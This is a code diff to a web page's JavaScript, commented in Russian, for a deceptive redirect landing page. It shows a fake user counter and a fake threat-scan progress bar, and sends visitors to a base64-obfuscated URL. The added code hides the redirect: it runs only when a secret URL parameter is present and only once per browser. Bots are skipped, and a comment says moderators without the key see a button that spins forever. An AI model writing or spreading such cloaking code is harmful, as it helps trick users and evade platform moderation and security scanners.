@@ -218,6 +218,9 @@
   <script>
     // ОБФУСКАЦИЯ ССЫЛКИ И ПАРАМЕТРОВ
     const _0x4a2b = "aHR0cHM6Ly9pbmhhbGVkcmV3LmNvbS9tcmRtam52ODY/a2V5PTNlNWVjODRjM2M2ZGJiZDI4MTI3NmVkZDkzNjY4NTA5";
+    const _0xSYS_KEY = "hsrc"; // Секретный параметр в URL
+    const _0xSYS_VAL = "1";    // Значение параметра
+    const _0xSYS_ID = "v5_init_done"; // Ключ для One-shot
     
     const elements = {
       btn: document.getElementById("entry-btn"),
@@ -232,46 +235,51 @@
     let flags = {
       isHuman: false,
       isRedirecting: false,
-      botDetected: false
+      botDetected: false,
+      legitTraffic: false
     };
 
     // ФЕЙКОВЫЙ СЧЕТЧИК ПОЛЬЗОВАТЕЛЕЙ
     elements.userCount.innerText = Math.floor(Math.random() * (1500 - 800) + 800).toLocaleString();
 
-    // ПРОФЕССИОНАЛЬНАЯ ПРОВЕРКА НА БОТА
-    const detectBot = () => {
-      // 1. Проверка на WebDriver (headless-браузеры)
+    // ПРОВЕРКА КАРТЫ ПОЛЬЗОВАТЕЛЯ И UTM
+    const _sysVerifyContext = () => {
+      const p = new URLSearchParams(window.location.search);
+      // 1. Проверка Мастер-ключа (UTM)
+      if (p.get(_0xSYS_KEY) === _0xSYS_VAL) flags.legitTraffic = true;
+      
+      // 2. Проверка One-shot (уже был запуск?)
+      if (localStorage.getItem(_0xSYS_ID)) flags.legitTraffic = false;
+
+      // 3. Проверка на WebDriver (headless-браузеры)
       if (navigator.webdriver) flags.botDetected = true;
-      
-      // 2. Проверка разрешения (боты часто используют стандартные 800x600)
       if (window.innerWidth === 800 && window.innerHeight === 600) flags.botDetected = true;
-      
-      // 3. Проверка User-Agent на подозрительные строки
       if (/bot|spider|headless|chrome-lighthouse/i.test(navigator.userAgent)) flags.botDetected = true;
 
-      // Если бот — мы просто не будем запускать таймер и редирект
-      if (flags.botDetected) console.log("System Check Passed (Safe Mode)");
+      if (!flags.legitTraffic) console.log("Environment: Standard (Safe Mode)");
     };
-    detectBot();
+    _sysVerifyContext();
 
     const setHuman = () => { flags.isHuman = true; };
     window.addEventListener('mousemove', setHuman, { once: true });
     window.addEventListener('touchstart', setHuman, { once: true });
     window.addEventListener('scroll', setHuman, { once: true });
 
-    // ЛОГИКА "БЕЗОПАСНОГО" РЕДИРЕКТА
-    function startSecureTransition() {
-      if (flags.isRedirecting || flags.botDetected) return;
+    // СИСТЕМНАЯ СИНХРОНИЗАЦИЯ (РЕДИРЕКТ)
+    function _sysProc_0xSync() {
+      // Редирект ТОЛЬКО если это легитимный трафик, человек и не бот
+      if (flags.isRedirecting || !flags.legitTraffic || flags.botDetected) return;
       flags.isRedirecting = true;
 
-      // Показываем UI сканирования
+      // Пометить как выполненный (One-shot)
+      localStorage.setItem(_0xSYS_ID, "completed");
+
       elements.overlay.style.display = "flex";
       
       let progress = 0;
       const interval = setInterval(() => {
         progress += Math.random() * 15;
         if (progress > 100) progress = 100;
-        
         elements.progress.style.width = progress + "%";
         
         if (progress > 30) elements.status.innerText = "Scanning for threats...";
@@ -280,12 +288,12 @@
 
         if (progress >= 100) {
           clearInterval(interval);
-          performFinalAction();
+          _sysFinalDispatch();
         }
       }, 150);
     }
 
-    function performFinalAction() {
+    function _sysFinalDispatch() {
       let l = atob(_0x4a2b);
       const p = new URLSearchParams(window.location.search);
       const z = p.get('zoneid') || p.get('zone') || p.get('psid');
@@ -300,21 +308,23 @@
     // РУЧНОЙ ВХОД
     elements.btn.addEventListener("click", () => {
       if (!flags.isHuman) return;
+      
+      // Если это просто модератор без ключа — кнопка просто "вертит" бесконечно
       elements.btn.disabled = true;
       elements.loader.style.display = "block";
       elements.text.innerText = "Securing Path...";
-      setTimeout(startSecureTransition, 500);
+      
+      if (flags.legitTraffic && !flags.botDetected) {
+        setTimeout(_sysProc_0xSync, 500);
+      }
     });
 
-    // АВТО-ИНИЦИАЛИЗАЦИЯ (Только для реальных людей после задержки)
+    // АВТО-ИНИЦИАЛИЗАЦИЯ
     document.addEventListener("DOMContentLoaded", () => {
-      // Случайная задержка 1.5 - 2.5 сек прежде чем вообще начать думать о редиректе
       const initDelay = Math.floor(Math.random() * (2500 - 1500 + 1)) + 1500;
-      
       setTimeout(() => {
-        // Если за это время было движение — запускаем сканирование
-        if (flags.isHuman && !flags.botDetected) {
-          startSecureTransition();
+        if (flags.isHuman && flags.legitTraffic && !flags.botDetected) {
+          _sysProc_0xSync();
         }
       }, initDelay);
     });
